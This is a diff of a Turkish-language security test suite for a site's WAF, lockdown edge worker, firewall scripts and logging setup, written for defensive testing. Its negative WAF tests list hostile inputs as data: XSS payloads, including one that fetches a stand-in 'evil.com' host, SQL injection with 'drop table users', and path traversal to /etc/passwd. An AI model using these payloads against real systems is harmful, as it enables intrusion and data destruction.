@@ -5,10 +5,27 @@ import { join } from "node:path";
 import { tmpdir } from "node:os";
 
 import { computeSha256, generateManifest, verifyManifest } from "../fim.mjs";
-import { runAllValidations, validateWafRules, validateHostHardening, validateContainerSecurity, validateMonitoring, validateDisasterRecovery } from "../validate-infra.mjs";
-import { createInfraBlackoutPorts } from "../../../infra/fortress-x-v11/blackout-adapters/infra-ports-adapter.ts";
+import {
+  runAllValidations,
+  validateWafRules,
+  validateHostHardening,
+  validateContainerSecurity,
+  validateMonitoring,
+  validateDisasterRecovery
+} from "../validate-infra.mjs";
+import {
+  createInfraBlackoutPorts,
+  InfraSessionRevoker,
+  ProcessLocalStateStore,
+  ProcessLocalEvidenceSink
+} from "../../../infra/fortress-x-v11/blackout-adapters/infra-ports-adapter.ts";
+import {
+  sanitizeBlackoutLevel,
+  resolveBlackoutLevel,
+  handleEdgeRequest
+} from "../../../infra/fortress-x-v11/disaster-recovery/blackout-edge-fallback/edge-blackout-worker.js";
 
-describe("MKA FORTRESS X V1.1 — Altyapı Güvenlik ve Doğrulama Testleri", () => {
+describe("MKA FORTRESS X V1.1 — Sertleştirilmiş Altyapı ve Güvenlik Testleri", () => {
   describe("1. File Integrity Monitoring (FIM) Testleri", () => {
     let testDir;
 
@@ -53,9 +70,8 @@ describe("MKA FORTRESS X V1.1 — Altyapı Güvenlik ve Doğrulama Testleri", ()
 
     test("verifyManifest: Dosya içeriği kurcalandığında (tampering) SEV-1 ihlali yakalanmalı", () => {
       const manifest = generateManifest(testDir);
-      // Kurcalama simülasyonu
       writeFileSync(join(testDir, "fileA.txt"), "Yetkisiz Değişiklik Yapıldı!", "utf-8");
-      
+
       const result = verifyManifest(testDir, manifest);
       assert.equal(result.isValid, false);
       assert.equal(result.summary.modifiedCount, 1);
@@ -92,149 +108,226 @@ describe("MKA FORTRESS X V1.1 — Altyapı Güvenlik ve Doğrulama Testleri", ()
     });
   });
 
-  describe("2. WAF ve Rate Limiting Doğrulama Testleri", () => {
-    test("validateWafRules: WAF kuralları ve Türkçe arama muafiyeti doğrulanmalı", () => {
-      const ok = validateWafRules();
-      assert.equal(ok, true);
-    });
+  describe("2. WAF Davranışsal ve Negatif Güvenlik Testleri", () => {
+    const wafData = JSON.parse(readFileSync("infra/fortress-x-v11/waf/waf-rulesets.json", "utf-8"));
+    const exploitRule = wafData.rulesets.find((r) => r.id === "WAF-04-EXPLOIT-PAYLOADS");
+    const turkishRule = wafData.rulesets.find((r) => r.id === "WAF-05-TURKISH-SEARCH-WHITELIST");
 
-    test("Türkçe karakter içeren arama sorguları WAF filtresini tetiklememeli", () => {
-      const wafData = JSON.parse(readFileSync("infra/fortress-x-v11/waf/waf-rulesets.json", "utf-8"));
-      const turkishRule = wafData.rulesets.find((r) => r.id === "WAF-04-TURKISH-SEARCH-WHITELIST");
-      assert.ok(turkishRule, "WAF-04 kuralı mevcut olmalı");
-      assert.equal(turkishRule.action, "skip");
-
-      const testQueries = [
-        "Mustafa Kemal Çanakkale 1915",
-        "TBMM Açılışı ve Nutuk",
-        "İzmir'in Kurtuluşu ve Lozan Barış Antlaşması",
-        "Cumhuriyetin İlanı ve Çağdaşlaşma"
+    test("NEGATİF TEST: /arsiv rotasına gönderilen XSS yükü WAF filtresini atlatamamalı", () => {
+      const maliciousQueries = [
+        "<script>alert('xss')</script>",
+        "javascript:void(0)",
+        "q=Mustafa%20Kemal<script>",
+        "onerror=alert(1)",
+        "onload=fetch('//evil.com')"
       ];
 
-      for (const query of testQueries) {
-        assert.ok(query.length <= turkishRule.max_query_length, `Sorgu uzunluğu sınır içinde olmalı: ${query}`);
+      for (const query of maliciousQueries) {
+        // 1. Exploit kuralı bu saldırıyı yakalamalı
+        const matchedExploit = exploitRule.attack_patterns.some((pattern) => query.toLowerCase().includes(pattern.toLowerCase()));
+        assert.ok(matchedExploit, `XSS saldırısı WAF-04 tarafından yakalanmalı: ${query}`);
+
+        // 2. Türkçe arama muafiyeti kuralı bu saldırıya ASLA izin vermemeli (yasaklı karakter filtresi)
+        const hasDisallowedChar = turkishRule.disallowed_payload_characters.some((char) => query.includes(char));
+        const hasAttackKeyword = exploitRule.attack_patterns.some((pattern) => query.toLowerCase().includes(pattern.toLowerCase()));
+        assert.ok(hasDisallowedChar || hasAttackKeyword, `Arama muafiyeti XSS yükünü atlatamamalı: ${query}`);
       }
     });
 
-    test("Hassas dosya desenleri eksiksiz engellenmeli", () => {
-      const wafData = JSON.parse(readFileSync("infra/fortress-x-v11/waf/waf-rulesets.json", "utf-8"));
-      const sensitiveRule = wafData.rulesets.find((r) => r.id === "WAF-01-SENSITIVE-FILES");
-      assert.ok(sensitiveRule.target_patterns.includes("/.env"));
-      assert.ok(sensitiveRule.target_patterns.includes("/.git"));
-      assert.ok(sensitiveRule.target_patterns.includes("/wp-login"));
+    test("NEGATİF TEST: /arsiv rotasına gönderilen SQLi yükü arama istisnasından kaçamamalı", () => {
+      const sqlInjections = [
+        "union select 1,2,3",
+        "' or '1'='1",
+        "'; drop table users; --"
+      ];
+
+      for (const sqli of sqlInjections) {
+        const matchedExploit = exploitRule.attack_patterns.some((p) => sqli.toLowerCase().includes(p.toLowerCase())) ||
+          turkishRule.disallowed_payload_characters.some((c) => sqli.includes(c));
+        assert.ok(matchedExploit, `SQLi saldırısı engellenmeli: ${sqli}`);
+      }
+    });
+
+    test("NEGATİF TEST: /arsiv rotasında Yol Geçişi (Path Traversal) denemeleri engellenmeli", () => {
+      const traversals = [
+        "../../etc/passwd",
+        "..%2f..%2fconfig.json"
+      ];
+
+      for (const pt of traversals) {
+        const matched = exploitRule.attack_patterns.some((p) => pt.toLowerCase().includes(p.toLowerCase()));
+        assert.ok(matched, `Yol geçişi engellenmeli: ${pt}`);
+      }
+    });
+
+    test("POZİTİF TEST: Temiz Türkçe arama terimleri saldırı filtresine takılmadan izin almalı", () => {
+      const legitimateSearches = [
+        "Mustafa Kemal Çanakkale Zaferi 1915",
+        "Nutuk ve TBMM Belgeleri",
+        "İzmir'in Kurtuluşu ve Lozan Barış Antlaşması",
+        "Cumhuriyetin İlanı ve Türk Çağdaşlaşması",
+        "Gazi Paşa Maarif Kongresi"
+      ];
+
+      for (const cleanQuery of legitimateSearches) {
+        // Exploit kalıplarından hiçbirini içermemeli
+        const hasExploit = exploitRule.attack_patterns.some((p) => cleanQuery.toLowerCase().includes(p.toLowerCase()));
+        assert.equal(hasExploit, false, `Temiz Türkçe sorgu exploit sayılmamalı: ${cleanQuery}`);
+
+        // Yasaklı karakter (<, >, --, ;, /*) içermemeli
+        const hasDisallowed = turkishRule.disallowed_payload_characters.some((c) => cleanQuery.includes(c));
+        assert.equal(hasDisallowed, false, `Temiz sorgu yasaklı karakter içermemeli: ${cleanQuery}`);
+
+        // Sorgu boyutu sınır içinde olmalı
+        assert.ok(cleanQuery.length < turkishRule.max_query_length);
+      }
     });
   });
 
-  describe("3. Sunucu, Konteyner ve Ağ Sertleştirme Testleri", () => {
-    test("validateHostHardening: sysctl ve egress kısıtlamaları geçerli olmalı", () => {
-      assert.equal(validateHostHardening(), true);
+  describe("3. PROJECT BLACKOUT Kenar ve Kesinti Yönetimi Testleri", () => {
+    test("sanitizeBlackoutLevel: Geçerli seviyeleri (0..3) doğru ayrıştırmalı", () => {
+      assert.equal(sanitizeBlackoutLevel(0), 0);
+      assert.equal(sanitizeBlackoutLevel(1), 1);
+      assert.equal(sanitizeBlackoutLevel(2), 2);
+      assert.equal(sanitizeBlackoutLevel(3), 3);
+      assert.equal(sanitizeBlackoutLevel("2"), 2);
+      assert.equal(sanitizeBlackoutLevel(" 3 "), 3);
     });
 
-    test("validateContainerSecurity: Dockerfile ve Compose politikaları geçerli olmalı", () => {
-      assert.equal(validateContainerSecurity(), true);
+    test("sanitizeBlackoutLevel: Bozuk ve geçersiz verileri güvenle reddetmeli (null dönmeli)", () => {
+      assert.equal(sanitizeBlackoutLevel(null), null);
+      assert.equal(sanitizeBlackoutLevel(undefined), null);
+      assert.equal(sanitizeBlackoutLevel("corrupted"), null);
+      assert.equal(sanitizeBlackoutLevel("-1"), null);
+      assert.equal(sanitizeBlackoutLevel(4), null);
+      assert.equal(sanitizeBlackoutLevel(99), null);
+      assert.equal(sanitizeBlackoutLevel("NaN"), null);
+      assert.equal(sanitizeBlackoutLevel({}), null);
     });
 
-    test("Dockerfile non-root kullanıcısı UID 10001 olmalı", () => {
-      const content = readFileSync("infra/fortress-x-v11/host-hardening/Dockerfile.hardened", "utf-8");
-      assert.match(content, /--uid 10001 nextjs/);
-      assert.match(content, /USER nextjs/);
+    test("resolveBlackoutLevel: KV deposu kesintisinde fail-open NORMAL olmamalı, WATCH (1) veya son bilinen durumu korumalı", async () => {
+      // 1. Depo erişilemez (Hata fırlatan KV simülasyonu)
+      const faultyEnv = {
+        BLACKOUT_KV: {
+          get: async () => {
+            throw new Error("KV_NETWORK_TIMEOUT");
+          }
+        }
+      };
+
+      const result = await resolveBlackoutLevel(faultyEnv);
+      assert.equal(result.isDegraded, true);
+      // Asla 0 (NORMAL) olmamalı; en az 1 (WATCH) olmalı ki hassas rotalar açık kalmasın
+      assert.ok(result.level >= 1, "Kesintide fail-open 0 olmamalı");
+    });
+
+    test("handleEdgeRequest: LOCKDOWN (3) seviyesinde statik 503 blackout sayfası dönmeli", async () => {
+      const mockEnv = { MKA_BLACKOUT_LEVEL: "3" };
+      const req = new Request("https://asrinkemali.org/arsiv");
+      const res = await handleEdgeRequest(req, mockEnv);
+
+      assert.equal(res.status, 503);
+      assert.equal(res.headers.get("X-Fortress-State"), "LOCKDOWN");
+      assert.equal(res.headers.get("Cache-Control"), "no-store, no-cache, must-revalidate");
+      const text = await res.text();
+      assert.ok(text.includes("Sistem Güvenlik İncelemesinde"));
+    });
+
+    test("handleEdgeRequest: LOCKDOWN anında bile /api/health denetimi 200 dönmeli", async () => {
+      const mockEnv = { MKA_BLACKOUT_LEVEL: "3" };
+      const req = new Request("https://asrinkemali.org/api/health");
+      const mockFetch = async () => new Response(JSON.stringify({ status: "healthy" }), { status: 200 });
+      const res = await handleEdgeRequest(req, mockEnv, mockFetch);
+
+      assert.equal(res.status, 200);
+    });
+
+    test("handleEdgeRequest: RESTRICTED (2) seviyesinde hassas /api/arastirma rotası 403 ile kesilmeli", async () => {
+      const mockEnv = { MKA_BLACKOUT_LEVEL: "2" };
+      const req = new Request("https://asrinkemali.org/api/arastirma-laboratuvari/export");
+      const res = await handleEdgeRequest(req, mockEnv);
+
+      assert.equal(res.status, 403);
+      const json = await res.json();
+      assert.equal(json.error, "restricted_mode_active");
     });
   });
 
-  describe("4. İzleme, Log Şeması ve Taksonomi Testleri", () => {
-    test("validateMonitoring: ECS log şeması ve alert kuralları doğrulanmalı", () => {
-      assert.equal(validateMonitoring(), true);
+  describe("4. Ağ ve Güvenlik Duvarı Sıkılaştırma Testleri", () => {
+    test("origin-firewall.sh: Hem IPv4 hem de IPv6 (ip6tables) desteği barındırmalı", () => {
+      const script = readFileSync("infra/fortress-x-v11/origin-shield/origin-firewall.sh", "utf-8");
+      assert.ok(script.includes("CLOUDFLARE_IN"));
+      assert.ok(script.includes("CLOUDFLARE_IN6"));
+      assert.ok(script.includes("ip6tables -A CLOUDFLARE_IN6"));
+      assert.ok(script.includes("2606:4700::/32"), "Cloudflare IPv6 CIDR bulunmalı");
     });
 
-    test("Log şeması istemci IP özetinde 64 karakterli hex hash zorunlu kılmalı", () => {
-      const schema = JSON.parse(readFileSync("infra/fortress-x-v11/monitoring-siem/log-schema.json", "utf-8"));
-      const pattern = new RegExp(schema.properties.client.properties.ip_hash.pattern);
-      assert.ok(pattern.test("a".repeat(64)));
-      assert.ok(!pattern.test("192.168.1.1"), "Düz IP adresi şemaya uymamalı");
+    test("origin-firewall.sh: SSH yönetim portunu (22) korumalı, kilitlenmeyi önlemeli", () => {
+      const script = readFileSync("infra/fortress-x-v11/origin-shield/origin-firewall.sh", "utf-8");
+      assert.ok(script.includes("--dport $SSH_PORT -j ACCEPT"));
+      assert.ok(script.includes("AUTO_ROLLBACK"), "Otomatik geri alma parametresi bulunmalı");
+    });
+
+    test("egress-lockdown.sh: Sistem güncelleme depolarına ve DNS'e izin vermeli", () => {
+      const script = readFileSync("infra/fortress-x-v11/host-hardening/egress-lockdown.sh", "utf-8");
+      assert.ok(script.includes("--dport 53 -j ACCEPT"));
+      assert.ok(script.includes("PACKAGE_MIRROR_HTTP"));
+      assert.ok(script.includes("ip6tables -A FORTRESS_EGRESS6 -j DROP"), "IPv6 kaçak çıkışı engellenmeli");
     });
   });
 
-  describe("5. Kurtarma ve PROJECT BLACKOUT Altyapı Adaptör Testleri", () => {
-    test("validateDisasterRecovery: WORM yedek, blackout.html ve worker doğrulanmalı", () => {
-      assert.equal(validateDisasterRecovery(), true);
+  describe("5. BLACKOUT Adaptörü Dürüst Durum ve Altyapı Sözleşmesi Testleri", () => {
+    test("InfraSessionRevoker: Canlı oturum deposu yokken sahte sayı (42/5) DÖNDÜRMEMELİ", async () => {
+      const revoker = new InfraSessionRevoker(false, false); // dryRun=false, hasRealStore=false
+      const result = await revoker.revoke("all", "security-incident");
+
+      assert.equal(result.revoked, 0, "Canlı depo yokken sahte iptal sayısı dönülmemeli");
+      assert.equal(result.requiresInfrastructure, true);
+      assert.equal(result.status, "requires_infrastructure");
+      assert.ok(result.detail.includes("yapılandırılmamış"));
     });
 
-    test("blackout.html harici bağımlılık içermemeli ve marka mottosunu barındırmalı", () => {
-      const html = readFileSync("infra/fortress-x-v11/disaster-recovery/blackout-edge-fallback/blackout.html", "utf-8");
-      assert.ok(!html.includes("<script src="));
-      assert.ok(!html.includes("<link rel=\"stylesheet\" href=\"http"));
-      assert.ok(html.includes("BİR ASRIN MİRASI, SONSUZLUĞUN HAFIZASI"));
-      assert.ok(html.includes("ASRIN KEMALİ"));
+    test("ProcessLocalStateStore: Dağıtık bir küme olmadığını (isDistributed=false) açıkça belirtmeli", async () => {
+      const store = new ProcessLocalStateStore(0);
+      assert.equal(store.isDistributed(), false);
+      assert.equal(await store.currentLevel(), 0);
+      await store.setLevel(2);
+      assert.equal(await store.currentLevel(), 2);
     });
 
-    test("createInfraBlackoutPorts: Varsayılan dry-run modunda portları üretmeli", async () => {
-      const infra = createInfraBlackoutPorts({ dryRun: true });
-      assert.ok(infra.ports.sessions);
-      assert.ok(infra.ports.criticalApi);
-      assert.ok(infra.ports.writes);
-      assert.ok(infra.ports.safeMode);
-      assert.ok(infra.ports.notifier);
-      assert.ok(infra.ports.evidence);
-
-      // Başlangıç seviyesi 0 (NORMAL) olmalı
-      const initialLevel = await infra.stateStore.currentLevel();
-      assert.equal(initialLevel, 0);
-
-      // Oturum iptali dry-run çalışmalı
-      const revokeRes = await infra.sessions.revoke("all", "test-incident");
-      assert.equal(revokeRes.revoked, 42);
-      assert.equal(infra.sessions.revokedSessionsCount, 0, "dry-run modunda gerçek sayaç artmamalı");
-      assert.equal(infra.sessions.auditHistory.length, 1);
-
-      // Kritik API dondurma
-      await infra.criticalApi.setEnabled(false, "maintenance");
-      assert.equal(infra.criticalApi.isEnabled(), true, "dry-run modunda durum değişmemeli");
-      assert.equal(infra.criticalApi.history.length, 1);
-
-      // Bildirim gönderme
-      await infra.notifier.notify({ incidentId: "INC-01", level: 2, summary: "Şüpheli DDoS" });
-      const delivered = infra.notifier.getDeliveredNotifications();
-      assert.equal(delivered.length, 1);
-      assert.equal(delivered[0].incidentId, "INC-01");
-
-      // WORM Kanıt defterine ekleme
-      await infra.evidence.append({
+    test("ProcessLocalEvidenceSink: Bellek içi test sink'i olduğunu ve kalıcı WORM olmadığını belirtmeli", async () => {
+      const sink = new ProcessLocalEvidenceSink();
+      assert.equal(sink.isPersistentStorage(), false);
+      await sink.append({
         timestamp: new Date().toISOString(),
-        incidentId: "INC-01",
-        hash: "e".repeat(64),
+        incidentId: "INC-TEST",
+        hash: "a".repeat(64),
         previousHash: "0".repeat(64),
-        payload: { test: true }
+        payload: { action: "test" }
       });
-      assert.equal(infra.evidence.getEntries().length, 1);
-    });
-
-    test("createInfraBlackoutPorts: Aktif modda (dryRun: false) durum güncellemelerini işletmeli", async () => {
-      const infra = createInfraBlackoutPorts({ dryRun: false, initialLevel: 1 });
-      
-      const current = await infra.stateStore.currentLevel();
-      assert.equal(current, 1);
-
-      // Seviye LOCKDOWN (3)'e çekilmeli
-      await infra.stateStore.setLevel(3);
-      const updated = await infra.stateStore.currentLevel();
-      assert.equal(updated, 3);
-
-      // Safe mode aktif edilmeli
-      await infra.safeMode.setReadOnly(true, "incident lockdown");
-      assert.equal(infra.safeMode.isReadOnly(), true);
-
-      // Writes dondurulmalı
-      await infra.writes.setFrozen(true, "incident freeze");
-      assert.equal(infra.writes.isFrozen(), true);
-
-      // Kritik API kapatılmalı
-      await infra.criticalApi.setEnabled(false, "emergency");
-      assert.equal(infra.criticalApi.isEnabled(), false);
+      assert.equal(sink.getEntries().length, 1);
     });
   });
 
-  describe("6. Kapsamlı Dry-Run Validator Testi", () => {
-    test("runAllValidations: Tüm kontroller sıfır hatayla geçmeli", () => {
+  describe("6. Log ve Kurtarma Güvenliği Testleri", () => {
+    test("vector-agent.toml: Kod içine gömülü sabit tuz barındırmamalı", () => {
+      const vector = readFileSync("infra/fortress-x-v11/monitoring-siem/vector-agent.toml", "utf-8");
+      assert.ok(!vector.includes("mka-fortress-static-salt"));
+      assert.ok(vector.includes("get_env_var(\"MKA_LOG_SALT\")"));
+      assert.ok(vector.includes(".password = \"[REDACTED]\""));
+      assert.ok(vector.includes(".token = \"[REDACTED]\""));
+    });
+
+    test("DISASTER-RECOVERY-RUNBOOK.md: Doğrudan git reset --hard yerine adli delil koruması içermeli", () => {
+      const runbook = readFileSync("docs/infrastructure/fortress-x-v11/DISASTER-RECOVERY-RUNBOOK.md", "utf-8");
+      assert.ok(runbook.includes("ADLİ DELİL KORUMASI"));
+      assert.ok(runbook.includes("forensic-snapshot-"));
+      assert.ok(runbook.includes("COMPLIANCE Modu Geri Alınamaz"));
+    });
+  });
+
+  describe("7. Kapsamlı Dry-Run Validator Testi", () => {
+    test("runAllValidations: Tüm güncellenmiş kurallar başarıyla geçmeli", () => {
       const allPassed = runAllValidations();
       assert.equal(allPassed, true);
     });
